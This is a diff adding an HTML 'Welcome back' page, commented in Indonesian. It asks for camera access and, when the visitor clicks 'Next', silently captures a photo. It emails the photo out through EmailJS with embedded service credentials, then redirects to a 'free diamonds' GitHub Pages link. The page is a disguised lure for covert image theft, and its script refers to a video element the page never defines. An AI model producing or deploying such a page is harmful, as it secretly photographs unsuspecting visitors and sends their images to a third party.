@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Welcome</title>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+</head>
+<body>
+
+<h3>Welcome back</h3>
+
+<br>
+<button onclick="ambilFoto()">Berikutnya</button>
+
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+emailjs.init("Ab3xvPQCqJkB8Kh_V");
+
+// Aktifkan kamera (muncul popup izin)
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+.then(function(stream){
+  document.getElementById("video").srcObject = stream;
+})
+.catch(function(err){
+  alert("Kamera tidak diizinkan");
+});
+
+function ambilFoto(){
+
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+  const context = canvas.getContext("2d");
+
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+
+  context.drawImage(video, 0, 0);
+
+  let imageData = canvas.toDataURL("image/png");
+
+  emailjs.send("service_lt5tmzc", "template_e16cgrw", {
+    image: imageData
+  }).then(function(){
+
+    // Setelah berhasil kirim → redirect
+    window.location.replace("https://diamondgratis169.github.io/Free/basudewa.html");
+
+  }).catch(function(){
+    alert("Gagal mengirim foto");
+  });
+
+}
+</script>
+
+</body>
+  </html>
